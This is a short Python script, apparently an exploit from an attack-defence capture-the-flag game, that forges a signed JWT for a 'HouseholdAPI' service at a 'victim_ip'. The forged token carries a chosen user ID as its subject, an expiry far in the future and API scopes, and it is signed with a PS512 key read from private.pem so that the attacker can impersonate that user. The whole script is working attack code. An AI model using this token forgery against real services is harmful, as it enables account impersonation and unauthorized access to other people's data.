# pip install jwt

import jwt

user_id = "8cef69c1-fa0a-494e-9767-a7e07853b8f0"
victim_ip = "http://10.60.22.2:5000"

def get_fake_jwt_token(victim_ip, user_id):
    payload = {
      "nbf": "1574490000",
      "exp": "1999999999",
      "iss": victim_ip,
      "aud": "HouseholdAPI",
      "client_id": "Household",
      "sub": user_id,
      "auth_time": "1574492300",
      "idp": "local",
      "scope": [
        "openid",
        "profile",
        "HouseholdAPI"
      ],
      "amr": [
        "pwd"
      ]
    }

    f = open('private.pem','r')
    key = f.read()

    encoded = jwt.encode(payload, key, algorithm='PS512')
    return encoded
